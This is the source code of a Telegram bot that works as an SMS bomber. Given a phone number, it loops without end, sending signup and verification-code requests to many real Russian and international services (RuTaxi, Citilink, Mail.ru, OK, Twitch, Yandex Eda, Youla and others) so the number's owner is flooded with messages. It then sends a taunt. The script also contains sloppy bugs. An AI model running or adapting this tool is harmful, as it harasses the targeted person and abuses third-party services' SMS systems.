import aiogram
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.bot import api
import keyboards as kb
import logging
import json
import keyboards as kb
import requests
import random
import datetime
import sys
import time
import argparse
import os
from colorama import Fore, Back, Style

logging.basicConfig(level=logging.INFO)

with open("config.json", "r") as f:
    token = json.load(f)

bot = Bot(token["token"])
dp = Dispatcher(bot=bot)

@dp.message_handler(commands=['start'])
async def bomber(message: types.Message):
	_phone = message.text.replace("/start", "")
	if _phone == 11:
		_name = ''
		iteration = 0
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		_email = _name + f'{iteration}' + '@gmail.com'
		_email = _name + f'{iteration}' + '@gmail.com'
		try:
			_phone9 = _phone[1:]
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone, "username": username})
			print('[+] Twitch отправлено!')
		except:
			print('[-] Не отправлено!')
		await bot.send_message(message.chat.id, "lame  owned u number ahhahahaha")
	sti = open('stickers/start.webp','rb')
	await bot.send_sticker(message.chat.id, sti)
	await message.answer("sd", parse_mode="html", reply_markup=kb.valorant)

@dp.message_handler()
async def get_user_message(message: types.Message):
	if len(message.text) == 11:
		_phone = message.text
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

		_phone9 = _phone[1:]
		_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
																											 9:11]
		_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
		_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
		_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
																											   9:11]
		_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

		iteration = 0
		while True:
			_email = _name + f'{iteration}' + '@gmail.com'
			email = _name + f'{iteration}' + '@gmail.com'
			try:
				requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
				print('[+] RuTaxi отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
				print('[+] Sunlight отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
				print('[+] Citilink отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api.delitime.ru/api/v2/signup",
							  data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
				print('[+] Delitime отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
							  data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
									"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
				print('[+] ICQ отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://cloud.mail.ru/api/v2/notify/applink',
							  json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
				print('[+] Mail.ru отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
							  data={"st.r.phone": "+" + _phone})
				print('[+] OK отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://passport.twitch.tv/register?trusted_request=true',
							  json={"birthday": {"day": 11, "month": 11, "year": 1999},
									"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
									"password": password, "phone_number": _phone, "username": username})
				print('[+] Twitch отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
							  json={"phone_number": "+" + _phone})
				print('[+] Eda.Yandex отправлено!')
			except:
				print('[-] Не отправлено!')
			try:
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
				print('[+] Youla отправлено!')
			except:
				print('[-] Не отправлено!')
				try:
					iteration += 0
					print(('{} круг пройден.').format(iteration))
				except:
					break
			await bot.send_message(message.chat.id, "lame  owned u number ahhahahaha")
	# message.text


if __name__ == "__main__":
	executor.start_polling(dp, skip_updates=True)
